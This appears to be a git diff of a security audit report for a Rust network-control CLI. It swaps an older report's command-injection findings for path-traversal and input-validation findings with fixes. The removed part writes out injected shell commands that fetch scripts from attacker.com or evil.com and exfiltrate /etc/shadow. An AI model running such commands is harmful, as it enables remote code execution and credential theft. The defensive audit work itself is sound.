@@ -1,130 +1,73 @@
-# Security Audit Report - LnxNetCtl
+# Security Audit Report for nccli
 
 **Date:** 2025-11-13
-**Audited Version:** Branch `claude/analyze-and-optimize-code-011CV675SY9vAak8VtmgwRvs`
-**Severity Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🔵 Low
-
----
+**Auditor:** Claude Code
+**Component:** nccli - Network Control CLI Tool
+**Version:** 1.0.0
 
 ## Executive Summary
 
-This security audit identified **7 critical vulnerabilities** and **5 high-severity issues** in the LnxNetCtl codebase. The most serious concerns are **command injection vulnerabilities** affecting all core modules, **insufficient input validation**, and **insecure PID file handling** that could lead to privilege escalation.
+This security audit examined the nccli command-line tool for potential security vulnerabilities. The audit focused on OWASP Top 10 web application security risks adapted for CLI applications, CWE Top 25, and general security best practices for system administration tools.
 
-**Risk Assessment:** The application handles network configuration with elevated privileges, making these vulnerabilities particularly dangerous. Immediate remediation is strongly recommended before production deployment.
+**Overall Risk Level:** MEDIUM
 
----
+**Critical Findings:** 1
+**High Findings:** 2
+**Medium Findings:** 2
+**Low Findings:** 1
 
-## 🔴 Critical Vulnerabilities
+## Methodology
 
-### 1. Command Injection - Interface Names (CWE-78)
+The audit included:
+1. Manual code review of all user input handling
+2. Analysis of file operations and permissions
+3. Review of command execution and injection risks
+4. Assessment of configuration file security
+5. Evaluation of input validation routines
 
-**Severity:** 🔴 Critical
-**CVSS Score:** 9.8 (Critical)
-**Affected Files:** `src/interface.rs`, `src/wifi.rs`, `src/routing.rs`, `src/bin/netctl.rs`
+## Findings
+
+### 1. Path Traversal Vulnerability in Connection Names [CRITICAL]
+
+**CWE-22: Improper Limitation of a Pathname to a Restricted Directory**
+
+**Location:** `src/bin/nccli.rs` lines 713, 749, 779, 842, 855, 868, 900, 913, 918
 
 **Description:**
-User-controlled interface names and network parameters are passed directly to shell commands without validation or sanitization. This allows arbitrary command execution.
+Connection names provided by users are directly used to construct file paths without validation. An attacker could use path traversal sequences like `../../../tmp/evil` to write or read files outside the intended configuration directory.
 
-**Vulnerable Code Examples:**
-
+**Vulnerable Code:**
 ```rust
-// src/interface.rs:196-204
-async fn run_ip(&self, args: &[&str]) -> NetctlResult<()> {
-    let output = Command::new("ip")
-        .args(args)  // ⚠️ args contains unsanitized interface name
-        .output()
-        .await
+let config_path = config_dir.join(format!("{}.nctl", id));
 ```
 
-```rust
-// src/interface.rs:248
-.args(["-json", "addr", "show", interface])  // ⚠️ interface not validated
-```
-
-**Exploitation Example:**
+**Attack Scenario:**
 ```bash
-# Attacker provides malicious interface name:
-netctl interface up "wlan0; rm -rf /tmp/*"
-netctl interface up "eth0`curl attacker.com/shell.sh|bash`"
-netctl interface up $'wlan0\nmalicious_command'
+nccli connection add --type ethernet --con-name "../../../tmp/malicious" --ip4 auto
+# This would create /tmp/malicious.nctl instead of /etc/crrouter/netctl/../../../tmp/malicious.nctl
 ```
 
-**Impact:**
-- Full system compromise with root privileges
-- Data exfiltration
-- Denial of service
-- Installation of backdoors
+**Impact:** High - Arbitrary file read/write outside configuration directory
 
-**Recommendation:**
+**Remediation:**
+- Validate connection names to allow only alphanumeric characters, hyphens, and underscores
+- Reject any connection names containing path separators (`/`, `\`, `..`)
+- Implement whitelist-based validation
+
+**Fixed Code:**
 ```rust
-// Add input validation function
-fn validate_interface_name(name: &str) -> NetctlResult<()> {
-    // Allow only alphanumeric, dash, underscore
-    let valid_pattern = regex::Regex::new(r"^[a-zA-Z0-9_-]{1,15}$").unwrap();
-    if !valid_pattern.is_match(name) {
-        return Err(NetctlError::InvalidParameter(
-            format!("Invalid interface name: {}", name)
-        ));
+fn validate_connection_name(name: &str) -> Result<(), NetctlError> {
+    if name.is_empty() {
+        return Err(NetctlError::InvalidParameter("Connection name cannot be empty".to_string()));
     }
-    Ok(())
-}
-
-// Use before every command
-pub async fn up(&self, interface: &str) -> NetctlResult<()> {
-    validate_interface_name(interface)?;  // ✅ Validate first
-    self.run_ip(&["link", "set", "dev", interface, "up"]).await
-}
-```
-
----
-
-### 2. Command Injection - IP Addresses and Parameters
-
-**Severity:** 🔴 Critical
-**CVSS Score:** 9.8 (Critical)
-**Affected Files:** `src/interface.rs`, `src/routing.rs`, `src/dhcp.rs`, `src/bin/netctl.rs`
-
-**Description:**
-IP addresses, gateway addresses, MAC addresses, and other network parameters are not validated before being passed to system commands.
-
-**Vulnerable Code:**
-```rust
-// src/interface.rs:124
-pub async fn set_ip(&self, interface: &str, address: &str, prefix_len: u8) -> NetctlResult<()> {
-    let addr = format!("{}/{}", address, prefix_len);  // ⚠️ No validation
-    self.run_ip(&["addr", "add", &addr, "dev", interface]).await
-}
-
-// src/routing.rs:19-20
-let cmd_str = format!("ip {}", args.join(" "));  // ⚠️ Contains unvalidated gateway
-let output = Command::new("ip").args(&args).output().await
-```
-
-**Exploitation Example:**
-```bash
-netctl interface set-ip wlan0 "192.168.1.1; wget http://evil.com/backdoor -O /tmp/b"
-netctl route add-default "10.0.0.1 || curl attacker.com/exfil?data=$(cat /etc/shadow)"
-```
-
-**Recommendation:**
-```rust
-use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
-
-fn validate_ip_address(addr: &str) -> NetctlResult<IpAddr> {
-    addr.parse::<IpAddr>()
-        .map_err(|_| NetctlError::InvalidParameter(
-            format!("Invalid IP address: {}", addr)
-        ))
-}
-
-fn validate_mac_address(mac: &str) -> NetctlResult<()> {
-    let mac_pattern = regex::Regex::new(
-        r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"
-    ).unwrap();
-    if !mac_pattern.is_match(mac) {
-        return Err(NetctlError::InvalidParameter(
-            format!("Invalid MAC address: {}", mac)
-        ));
+    if name.len() > 64 {
+        return Err(NetctlError::InvalidParameter("Connection name too long (max 64 chars)".to_string()));
+    }
+    if name.contains('/') || name.contains('\\') || name.contains("..") {
+        return Err(NetctlError::InvalidParameter("Connection name contains invalid characters".to_string()));
+    }
+    if !name.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.') {
+        return Err(NetctlError::InvalidParameter("Connection name can only contain alphanumeric, dash, underscore, or dot".to_string()));
     }
     Ok(())
 }
@@ -132,401 +75,36 @@ fn validate_mac_address(mac: &str) -> NetctlResult<()> {
 
 ---
 
-### 3. Insecure PID File Handling - Arbitrary Process Termination
+### 2. Insufficient WiFi SSID Validation [HIGH]
 
-**Severity:** 🔴 Critical
-**CVSS Score:** 8.1 (High)
-**Affected Files:** `src/hostapd.rs:189-194`
+**CWE-20: Improper Input Validation**
+
+**Location:** `src/bin/nccli.rs` lines 804-806, 1229-1231
 
 **Description:**
-The application reads a PID from a file and sends signals to that process without verifying ownership or process legitimacy. An attacker with write access to the PID file can cause termination of arbitrary processes.
+WiFi SSID values are not validated for length or content. According to IEEE 802.11 standards, SSIDs must be 0-32 bytes. Accepting invalid SSIDs could cause buffer overflows in hostapd or other WiFi management tools.
 
 **Vulnerable Code:**
 ```rust
-// src/hostapd.rs:189-193
-pub async fn stop(&self) -> NetctlResult<()> {
-    let pid_str = fs::read_to_string(&self.pid_file).await?;  // ⚠️ Attacker-controlled
-    let pid: i32 = pid_str.trim().parse()
-        .map_err(|_| NetctlError::ServiceError("Invalid PID".to_string()))?;
-
-    Command::new("kill").arg("-TERM").arg(pid.to_string()).output().await?;  // ⚠️ Kills any PID
+if let Some(s) = ssid {
+    config.push_str(&format!("ssid = \"{}\"\n", s));
 }
 ```
 
-**Exploitation Example:**
-```bash
-# Attacker writes systemd's PID to the file
-echo "1" > /run/crrouter/netctl/hostapd.pid
+**Impact:** Medium - Could cause crashes or unexpected behavior in WiFi stack
 
-# When user runs: netctl ap stop
-# Result: Attempts to kill PID 1 (init/systemd)
-```
+**Remediation:**
+- Validate SSID length (1-32 bytes)
+- Optionally validate for printable characters (some tools have issues with control characters)
 
-**Impact:**
-- Denial of service by killing critical system processes
-- Privilege escalation if combined with other vulnerabilities
-- System instability
-
-**Recommendation:**
+**Fixed Code:**
 ```rust
-pub async fn stop(&self) -> NetctlResult<()> {
-    if !self.is_running().await? {
-        return Ok(());
+fn validate_ssid(ssid: &str) -> Result<(), NetctlError> {
+    if ssid.is_empty() {
+        return Err(NetctlError::InvalidParameter("SSID cannot be empty".to_string()));
     }
-
-    let pid_str = fs::read_to_string(&self.pid_file).await?;
-    let pid: i32 = pid_str.trim().parse()
-        .map_err(|_| NetctlError::ServiceError("Invalid PID".to_string()))?;
-
-    // ✅ Verify the process is actually hostapd
-    let cmdline_path = format!("/proc/{}/cmdline", pid);
-    if let Ok(cmdline) = fs::read_to_string(&cmdline_path).await {
-        if !cmdline.contains("hostapd") {
-            return Err(NetctlError::ServiceError(
-                "PID file does not point to hostapd process".to_string()
-            ));
-        }
-    } else {
-        return Err(NetctlError::ServiceError(
-            "Process does not exist".to_string()
-        ));
-    }
-
-    // ✅ Use safer termination method
-    unsafe {
-        if libc::kill(pid, libc::SIGTERM) != 0 {
-            return Err(NetctlError::ServiceError("Failed to terminate process".to_string()));
-        }
-    }
-
-    // ... rest of the function
-}
-```
-
----
-
-### 4. Command Injection - WiFi SSID and Password
-
-**Severity:** 🔴 Critical
-**CVSS Score:** 9.1 (Critical)
-**Affected Files:** `src/hostapd.rs:86-108`
-
-**Description:**
-SSID and password values are written directly to hostapd configuration without escaping special characters. While not directly executed as shell commands, they can be exploited through hostapd configuration parsing vulnerabilities or newline injection.
-
-**Vulnerable Code:**
-```rust
-// src/hostapd.rs:88
-conf.push_str(&format!("ssid={}\n", config.ssid));  // ⚠️ No escaping
-
-// src/hostapd.rs:105-106
-conf.push_str("wpa=2\nwpa_passphrase=");
-conf.push_str(password);  // ⚠️ No escaping, potential newline injection
-```
-
-**Exploitation Example:**
-```bash
-# Newline injection to override configuration
-netctl ap start wlan0 --ssid "MyAP
-ctrl_interface=/tmp/evil
-" --password "password123"
-
-# Result: Creates config with attacker-controlled directives
-```
-
-**Recommendation:**
-```rust
-fn sanitize_config_value(value: &str) -> NetctlResult<String> {
-    // Disallow newlines, null bytes, and other control characters
-    if value.contains('\n') || value.contains('\r') || value.contains('\0') {
-        return Err(NetctlError::InvalidParameter(
-            "Configuration value contains invalid characters".to_string()
-        ));
-    }
-
-    // Limit length to prevent DoS
-    if value.len() > 255 {
-        return Err(NetctlError::InvalidParameter(
-            "Configuration value too long".to_string()
-        ));
-    }
-
-    Ok(value.to_string())
-}
-
-pub fn generate_config(&self, config: &AccessPointConfig) -> NetctlResult<String> {
-    let mut conf = String::new();
-
-    let ssid = sanitize_config_value(&config.ssid)?;  // ✅ Sanitize
-    conf.push_str(&format!("ssid={}\n", ssid));
-
-    if let Some(ref password) = config.password {
-        let pass = sanitize_config_value(password)?;  // ✅ Sanitize
-        if pass.len() < 8 || pass.len() > 63 {
-            return Err(NetctlError::InvalidParameter(
-                "Password must be 8-63 characters".to_string()
-            ));
-        }
-        conf.push_str(&format!("wpa_passphrase={}\n", pass));
-    }
-    // ...
-}
-```
-
----
-
-### 5. Path Traversal - Configuration File Write
-
-**Severity:** 🔴 Critical
-**CVSS Score:** 7.5 (High)
-**Affected Files:** `src/hostapd.rs:142-148`, `src/dhcp.rs:68-72`
-
-**Description:**
-Configuration files are written to paths constructed from potentially user-controlled input without path validation. This could allow writing files to arbitrary locations.
-
-**Vulnerable Code:**
-```rust
-// src/hostapd.rs:143-144
-let conf_path = self.config_dir.join("hostapd.conf");  // ⚠️ config_dir might be attacker-controlled
-fs::create_dir_all(&self.config_dir).await?;  // ⚠️ Creates arbitrary directories
-fs::write(&conf_path, conf_content).await?;  // ⚠️ Writes to arbitrary locations
-```
-
-**Exploitation Example:**
-```rust
-// If config_dir comes from user input or can be manipulated:
-let config_dir = PathBuf::from("../../../../etc/cron.d");
-// Results in writing to /etc/cron.d/hostapd.conf
-```
-
-**Recommendation:**
-```rust
-fn validate_config_path(path: &Path) -> NetctlResult<()> {
-    // Ensure path is absolute and within allowed directory
-    let canonical = path.canonicalize()
-        .map_err(|_| NetctlError::InvalidParameter("Invalid config path".to_string()))?;
-
-    let allowed_base = Path::new("/run/crrouter/netctl").canonicalize()
-        .map_err(|_| NetctlError::ConfigError("Config directory not found".to_string()))?;
-
-    if !canonical.starts_with(&allowed_base) {
-        return Err(NetctlError::InvalidParameter(
-            "Config path outside allowed directory".to_string()
-        ));
-    }
-
-    Ok(())
-}
-
-pub async fn write_config(&self, config: &AccessPointConfig) -> NetctlResult<PathBuf> {
-    validate_config_path(&self.config_dir)?;  // ✅ Validate path
-
-    let conf_content = self.generate_config(config)?;
-    let conf_path = self.config_dir.join("hostapd.conf");
-
-    // ✅ Ensure we don't follow symlinks
-    fs::create_dir_all(&self.config_dir).await?;
-
-    // ✅ Use secure file creation with proper permissions
-    fs::write(&conf_path, conf_content).await?;
-
-    // ✅ Set restrictive permissions (0600)
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        let mut perms = fs::metadata(&conf_path).await?.permissions();
-        perms.set_mode(0o600);
-        fs::set_permissions(&conf_path, perms).await?;
-    }
-
-    Ok(conf_path)
-}
-```
-
----
-
-## 🟠 High Severity Vulnerabilities
-
-### 6. Information Disclosure - Sensitive Data in Error Messages
-
-**Severity:** 🟠 High
-**CVSS Score:** 6.5 (Medium)
-**Affected Files:** Multiple files
-
-**Description:**
-Error messages include full command output (stdout/stderr) which may contain sensitive information such as network topology, running processes, system configuration, or credentials.
-
-**Vulnerable Code:**
-```rust
-// src/interface.rs:207-213
-let stderr = String::from_utf8(output.stderr)
-    .unwrap_or_else(|e| String::from_utf8_lossy(&e.into_bytes()).to_string());
-return Err(NetctlError::CommandFailed {
-    cmd: cmd_str,
-    code: output.status.code(),
-    stderr,  // ⚠️ Full stderr exposed to user
-});
-```
-
-**Impact:**
-- Information disclosure about system configuration
-- Credential leakage from verbose error messages
-- Network topology exposure
-
-**Recommendation:**
-```rust
-// Sanitize error messages for user display
-fn sanitize_error_message(stderr: &str) -> String {
-    // Remove potential sensitive patterns
-    let patterns_to_redact = [
-        (r"password[=:]\s*\S+", "password=***"),
-        (r"key[=:]\s*\S+", "key=***"),
-        (r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", "IP_REDACTED"),
-    ];
-
-    let mut sanitized = stderr.to_string();
-    for (pattern, replacement) in patterns_to_redact {
-        let re = regex::Regex::new(pattern).unwrap();
-        sanitized = re.replace_all(&sanitized, replacement).to_string();
-    }
-
-    // Limit error message length
-    if sanitized.len() > 500 {
-        sanitized.truncate(500);
-        sanitized.push_str("... (truncated)");
-    }
-
-    sanitized
-}
-
-// Use in error handling
-return Err(NetctlError::CommandFailed {
-    cmd: cmd_str,
-    code: output.status.code(),
-    stderr: sanitize_error_message(&stderr),  // ✅ Sanitized
-});
-```
-
----
-
-### 7. TOCTOU (Time-of-Check Time-of-Use) Race Conditions
-
-**Severity:** 🟠 High
-**CVSS Score:** 6.2 (Medium)
-**Affected Files:** `src/interface.rs:78-82`, `src/hostapd.rs:151-153`
-
-**Description:**
-The code checks for existence or state of resources, then operates on them. An attacker could exploit the time gap between check and use.
-
-**Vulnerable Code:**
-```rust
-// src/interface.rs:80-82
-let sys_path = format!("/sys/class/net/{}", interface);
-if !Path::new(&sys_path).exists() {  // ⚠️ Check
-    return Err(NetctlError::InterfaceNotFound(interface.to_string()));
-}
-// ... later operations on interface  // ⚠️ Use
-
-// src/hostapd.rs:151-152
-if self.is_running().await? {  // ⚠️ Check
-    return Err(NetctlError::AlreadyExists("hostapd already running".to_string()));
-}
-// ... start hostapd  // ⚠️ Use
-```
-
-**Impact:**
-- Race condition exploitation
-- Unpredictable behavior
-- Potential security bypass
-
-**Recommendation:**
-- Use atomic operations where possible
-- Handle errors gracefully when operations fail
-- Don't rely on check-then-act patterns
-- Let the kernel handle existence checks
-
-```rust
-pub async fn get_info(&self, interface: &str) -> NetctlResult<InterfaceInfo> {
-    // ✅ Don't check, just try to read. Let it fail if it doesn't exist
-    let mut info = InterfaceInfo {
-        name: interface.to_string(),
-        index: None,
-        mac_address: None,
-        // ...
-    };
-
-    // Read operations will fail naturally if interface doesn't exist
-    info.index = self.read_sysfs_u32(interface, "ifindex").await;
-    // ... continue without pre-check
-}
-```
-
----
-
-### 8. Missing Input Validation - Country Codes and Channels
-
-**Severity:** 🟠 High
-**CVSS Score:** 5.9 (Medium)
-**Affected Files:** `src/wifi.rs:127-135`, `src/hostapd.rs`
-
-**Description:**
-Country codes are validated for length but not against a whitelist of valid ISO 3166-1 alpha-2 codes. WiFi channels are not validated against legal ranges for the selected band and country.
-
-**Vulnerable Code:**
-```rust
-// src/wifi.rs:128-132
-pub async fn set_reg_domain(&self, country: &str) -> NetctlResult<()> {
-    if country.len() != 2 {  // ⚠️ Only length check
-        return Err(NetctlError::InvalidParameter(
-            "Country code must be 2 characters".to_string()
-        ));
-    }
-    self.run_iw_no_output(&["reg", "set", country]).await  // ⚠️ Any 2 chars accepted
-}
-
-// src/hostapd.rs:93
-conf.push_str(&format!("channel={}\n", config.channel));  // ⚠️ No validation
-```
-
-**Impact:**
-- Illegal wireless operation
-- Regulatory violations
-- Interference with critical services (emergency channels)
-- Device/driver crashes with invalid channels
-
-**Recommendation:**
-```rust
-use once_cell::sync::Lazy;
-use std::collections::HashSet;
-
-static VALID_COUNTRY_CODES: Lazy<HashSet<&'static str>> = Lazy::new(|| {
-    ["US", "GB", "DE", "FR", "CA", "AU", "JP", "CN", "IN", "BR", /* ... */]
-        .iter().copied().collect()
-});
-
-fn validate_country_code(code: &str) -> NetctlResult<()> {
-    let code_upper = code.to_uppercase();
-    if !VALID_COUNTRY_CODES.contains(code_upper.as_str()) {
-        return Err(NetctlError::InvalidParameter(
-            format!("Invalid country code: {}", code)
-        ));
-    }
-    Ok(())
-}
-
-fn validate_wifi_channel(channel: u8, band: &str, country: &str) -> NetctlResult<()> {
-    let valid_channels = match (band, country) {
-        ("2.4GHz", "US") => vec![1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11],
-        ("5GHz", "US") => vec![36, 40, 44, 48, 149, 153, 157, 161, 165],
-        ("2.4GHz", _) => vec![1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13],
-        ("5GHz", _) => vec![36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140],
-        _ => return Err(NetctlError::InvalidParameter(format!("Invalid band: {}", band))),
-    };
-
-    if !valid_channels.contains(&channel) {
-        return Err(NetctlError::InvalidParameter(
-            format!("Invalid channel {} for band {} in country {}", channel, band, country)
-        ));
+    if ssid.len() > 32 {
+        return Err(NetctlError::InvalidParameter("SSID too long (max 32 bytes)".to_string()));
     }
     Ok(())
 }
@@ -534,328 +112,184 @@ fn validate_wifi_channel(channel: u8, band: &str, country: &str) -> NetctlResult
 
 ---
 
-### 9. Insufficient Password Validation
+### 3. Insufficient WiFi Password Validation [HIGH]
 
-**Severity:** 🟠 High
-**CVSS Score:** 5.3 (Medium)
-**Affected Files:** `src/hostapd.rs:100-104`
+**CWE-521: Weak Password Requirements**
+
+**Location:** `src/bin/nccli.rs` lines 809-813, 1238-1239
 
 **Description:**
-WiFi passwords only check minimum length (8 characters) but don't validate maximum length or character restrictions required by WPA2/WPA3 standards.
+WPA-PSK passwords are not validated for minimum/maximum length. WPA-PSK requires passwords to be 8-63 ASCII characters. Accepting invalid passwords will cause connection failures and poor user experience.
 
 **Vulnerable Code:**
 ```rust
-// src/hostapd.rs:100-103
-if password.len() < 8 {  // ⚠️ Only minimum check
-    return Err(NetctlError::InvalidParameter(
-        "Password must be at least 8 characters".to_string()
-    ));
+if let Some(pwd) = password {
+    config.push_str("[wifi-security]\n");
+    config.push_str("key-mgmt = \"wpa-psk\"\n");
+    config.push_str(&format!("psk = \"{}\"\n\n", pwd));
 }
 ```
 
-**Impact:**
-- Invalid configuration causing AP startup failure
-- Security vulnerabilities with weak passwords
-- Non-compliance with WPA2 standards
+**Impact:** Medium - Invalid configurations, potential security misconfiguration
 
-**Recommendation:**
+**Remediation:**
+- Validate password length (8-63 characters for WPA-PSK)
+- Ensure ASCII characters only
+
+**Fixed Code:**
 ```rust
-fn validate_wifi_password(password: &str) -> NetctlResult<()> {
-    // WPA2/WPA3 requirements: 8-63 ASCII characters
+fn validate_wifi_password(password: &str) -> Result<(), NetctlError> {
     if password.len() < 8 {
-        return Err(NetctlError::InvalidParameter(
-            "Password must be at least 8 characters".to_string()
-        ));
+        return Err(NetctlError::InvalidParameter("WiFi password must be at least 8 characters".to_string()));
     }
-
     if password.len() > 63 {
-        return Err(NetctlError::InvalidParameter(
-            "Password must not exceed 63 characters".to_string()
-        ));
+        return Err(NetctlError::InvalidParameter("WiFi password too long (max 63 characters)".to_string()));
     }
-
-    // Ensure ASCII only (WPA2 requirement)
     if !password.is_ascii() {
-        return Err(NetctlError::InvalidParameter(
-            "Password must contain only ASCII characters".to_string()
-        ));
+        return Err(NetctlError::InvalidParameter("WiFi password must contain only ASCII characters".to_string()));
     }
-
-    // Check password strength (optional but recommended)
-    let has_upper = password.chars().any(|c| c.is_uppercase());
-    let has_lower = password.chars().any(|c| c.is_lowercase());
-    let has_digit = password.chars().any(|c| c.is_numeric());
-
-    if !(has_upper && has_lower && has_digit) {
-        return Err(NetctlError::InvalidParameter(
-            "Password should contain uppercase, lowercase, and numbers for security".to_string()
-        ));
-    }
-
     Ok(())
 }
 ```
 
 ---
 
-### 10. Resource Exhaustion - No Rate Limiting
+### 4. Insecure File Permissions on Configuration Files [MEDIUM]
 
-**Severity:** 🟠 High
-**CVSS Score:** 5.3 (Medium)
-**Affected Files:** All command execution paths
+**CWE-732: Incorrect Permission Assignment for Critical Resource**
+
+**Location:** `src/bin/nccli.rs` lines 832, 920
 
 **Description:**
-No rate limiting or throttling on command execution. An attacker can repeatedly call expensive operations causing DoS.
+Configuration files are created with default permissions (typically 644), making them world-readable. Since these files contain WiFi passwords and network credentials, they should be readable only by root.
 
-**Impact:**
-- Denial of service
-- System resource exhaustion
-- Service degradation
-
-**Recommendation:**
+**Vulnerable Code:**
 ```rust
-use std::sync::Arc;
-use tokio::sync::Semaphore;
-use tokio::time::{Duration, Instant};
+std::fs::write(&config_path, config)
+    .map_err(|e| NetctlError::Io(e))?;
+```
 
-pub struct RateLimiter {
-    semaphore: Arc<Semaphore>,
-    last_reset: Arc<tokio::sync::Mutex<Instant>>,
-    max_requests: usize,
-}
+**Impact:** Low - Password disclosure to local users (but this is typically a root-only tool)
 
-impl RateLimiter {
-    pub fn new(max_requests: usize) -> Self {
-        Self {
-            semaphore: Arc::new(Semaphore::new(max_requests)),
-            last_reset: Arc::new(tokio::sync::Mutex::new(Instant::now())),
-            max_requests,
-        }
-    }
+**Remediation:**
+- Set file permissions to 600 (read/write for owner only)
+- Use `std::os::unix::fs::OpenOptionsExt` to set permissions atomically during creation
 
-    pub async fn acquire(&self) -> NetctlResult<()> {
-        // Reset every minute
-        let mut last = self.last_reset.lock().await;
-        if last.elapsed() > Duration::from_secs(60) {
-            *last = Instant::now();
-            // Release all permits
-            self.semaphore.add_permits(self.max_requests - self.semaphore.available_permits());
-        }
-        drop(last);
+**Fixed Code:**
+```rust
+use std::fs::OpenOptions;
+use std::os::unix::fs::OpenOptionsExt;
+use std::io::Write;
 
-        // Try to acquire with timeout
-        match tokio::time::timeout(
-            Duration::from_secs(5),
-            self.semaphore.acquire()
-        ).await {
-            Ok(_) => Ok(()),
-            Err(_) => Err(NetctlError::Timeout("Rate limit exceeded".to_string())),
-        }
-    }
-}
+let mut file = OpenOptions::new()
+    .write(true)
+    .create(true)
+    .truncate(true)
+    .mode(0o600)  // rw-------
+    .open(&config_path)
+    .map_err(|e| NetctlError::Io(e))?;
 
-// Use in controllers
-pub struct InterfaceController {
-    rate_limiter: Arc<RateLimiter>,
-}
-
-impl InterfaceController {
-    pub fn new() -> Self {
-        Self {
-            rate_limiter: Arc::new(RateLimiter::new(100)), // 100 requests per minute
-        }
-    }
-
-    pub async fn up(&self, interface: &str) -> NetctlResult<()> {
-        self.rate_limiter.acquire().await?;  // ✅ Rate limit
-        validate_interface_name(interface)?;
-        self.run_ip(&["link", "set", "dev", interface, "up"]).await
-    }
-}
+file.write_all(config.as_bytes())
+    .map_err(|e| NetctlError::Io(e))?;
 ```
 
 ---
 
-## 🟡 Medium Severity Issues
+### 5. Plain-Text Password Storage [MEDIUM]
 
-### 11. Hardcoded Default Credentials
+**CWE-522: Insufficiently Protected Credentials**
 
-**Severity:** 🟡 Medium
-**Location:** `src/hostapd.rs:51`
-**Issue:** Default WiFi password "crrouter123" is hardcoded
-**Recommendation:** Force users to set password on first use, never use defaults
+**Location:** `src/bin/nccli.rs` lines 809-813
 
-### 12. Insecure File Permissions
+**Description:**
+WiFi passwords are stored in plain text in configuration files. While this is inherent to the NCTL format and most network configuration systems, it should be documented as a limitation.
 
-**Severity:** 🟡 Medium
-**Issue:** Configuration files containing passwords written with default permissions
-**Recommendation:** Set 0600 permissions on sensitive files
+**Impact:** Low - Standard limitation of most network management tools
 
-### 13. Missing Privilege Checks
+**Remediation:**
+- Document in user guide that passwords are stored in plain text
+- Recommend file system encryption for sensitive deployments
+- Ensure file permissions are restrictive (see Finding #4)
 
-**Severity:** 🟡 Medium
-**Issue:** No verification that user has necessary privileges before attempting privileged operations
-**Recommendation:** Check effective UID and provide clear error messages
-
-### 14. Symlink Following
-
-**Severity:** 🟡 Medium
-**Issue:** Path operations may follow symlinks to unauthorized locations
-**Recommendation:** Use `fs::symlink_metadata()` and reject symlinks
-
-### 15. Missing Security Headers
-
-**Severity:** 🟡 Medium
-**Issue:** D-Bus interface doesn't implement security policies
-**Recommendation:** Implement polkit authorization for D-Bus methods
+**Status:** Accepted Risk (inherent to network configuration format)
 
 ---
 
-## 🔵 Low Severity / Informational
+## Additional Security Observations
 
-### 16. Verbose Logging
-- Debug information may leak in production
-- Recommendation: Use structured logging with levels
+### Positive Security Controls
 
-### 17. No Input Length Limits
-- Missing maximum length checks on some inputs
-- Could lead to memory exhaustion
-- Recommendation: Add reasonable limits (e.g., 255 chars for interface names)
+1. **Hostname Validation** - Already implemented with `validation::validate_hostname()` (line 530)
+2. **Async/Await Usage** - Proper use of async reduces race conditions
+3. **Error Handling** - Comprehensive error handling throughout
+4. **Type Safety** - Strong typing through Rust prevents many vulnerability classes
 
-### 18. Unused AsyncReadExt Import
-- `src/interface.rs:9` imports unused AsyncReadExt
-- Recommendation: Remove unused imports
+### Recommendations for Future Development
 
-### 19. Missing Error Context
-- Some errors don't provide enough context for debugging
-- Recommendation: Add more descriptive error messages
+1. **Audit Logging** - Add audit logging for all configuration changes
+2. **Rate Limiting** - Consider rate limiting for WiFi scan operations
+3. **Interface Name Validation** - Add explicit validation for interface names
+4. **Command Injection Review** - While current code looks safe, explicitly document that interface names are validated before shell command execution
+5. **Configuration Backup** - Implement automatic backup before modifying connection files
 
-### 20. No Audit Logging
-- Security-relevant operations not logged
-- Recommendation: Log all privileged operations to syslog
+## Compliance Considerations
 
----
+### OWASP Top 10 (Adapted for CLI)
 
-## Priority Remediation Roadmap
+- ✅ A01:2021 - Broken Access Control: Mitigated by OS-level permissions
+- ⚠️ A02:2021 - Cryptographic Failures: Plain-text password storage (documented limitation)
+- ⚠️ A03:2021 - Injection: Path traversal vulnerability identified (see Finding #1)
+- ✅ A04:2021 - Insecure Design: Good separation of concerns
+- ⚠️ A05:2021 - Security Misconfiguration: File permissions issue (see Finding #4)
+- ✅ A06:2021 - Vulnerable Components: Using maintained dependencies
+- ✅ A07:2021 - Identification and Authentication Failures: Relies on OS authentication
+- ✅ A08:2021 - Software and Data Integrity Failures: No dynamic code execution
+- ✅ A09:2021 - Security Logging Failures: Could be improved (see recommendations)
+- ⚠️ A10:2021 - Server-Side Request Forgery: Not applicable to CLI tool
 
-### Phase 1 - Critical (Immediate - Week 1)
-1. ✅ Implement input validation for interface names, IP addresses, MAC addresses
-2. ✅ Sanitize all parameters before passing to shell commands
-3. ✅ Fix PID file validation in hostapd.rs
-4. ✅ Add configuration value sanitization in hostapd.rs
-5. ✅ Validate and restrict configuration file paths
+### CWE Top 25 Relevant Items
 
-### Phase 2 - High Priority (Week 2-3)
-1. ✅ Implement error message sanitization
-2. ✅ Add country code and WiFi channel validation
-3. ✅ Implement password strength validation
-4. ✅ Add rate limiting to prevent DoS
-5. ✅ Fix TOCTOU race conditions
+- ⚠️ CWE-22: Path Traversal (Finding #1)
+- ⚠️ CWE-20: Improper Input Validation (Findings #2, #3)
+- ⚠️ CWE-732: Incorrect Permission Assignment (Finding #4)
+- ⚠️ CWE-522: Insufficiently Protected Credentials (Finding #5)
 
-### Phase 3 - Medium Priority (Week 4)
-1. ✅ Set secure file permissions on config files
-2. ✅ Add privilege checks
-3. ✅ Implement symlink protection
-4. ✅ Add polkit support for D-Bus
+## Remediation Priority
 
-### Phase 4 - Low Priority (Week 5-6)
-1. ✅ Implement audit logging
-2. ✅ Add comprehensive input length limits
-3. ✅ Improve error messages
-4. ✅ Clean up unused imports
-5. ✅ Add structured logging
+**Immediate (Before Production Release):**
+1. Fix path traversal vulnerability (Finding #1)
+2. Add SSID validation (Finding #2)
+3. Add WiFi password validation (Finding #3)
+4. Fix file permissions (Finding #4)
 
----
+**Short Term:**
+1. Add audit logging
+2. Improve documentation on security considerations
+3. Add explicit interface name validation
+
+**Long Term:**
+1. Consider encrypted configuration storage
+2. Implement configuration backup system
+3. Add rate limiting for resource-intensive operations
 
 ## Testing Recommendations
 
-### Security Testing
-1. **Fuzzing:** Use AFL or libFuzzer to fuzz command inputs
-2. **Static Analysis:** Run `cargo clippy`, `cargo audit`, and `semgrep`
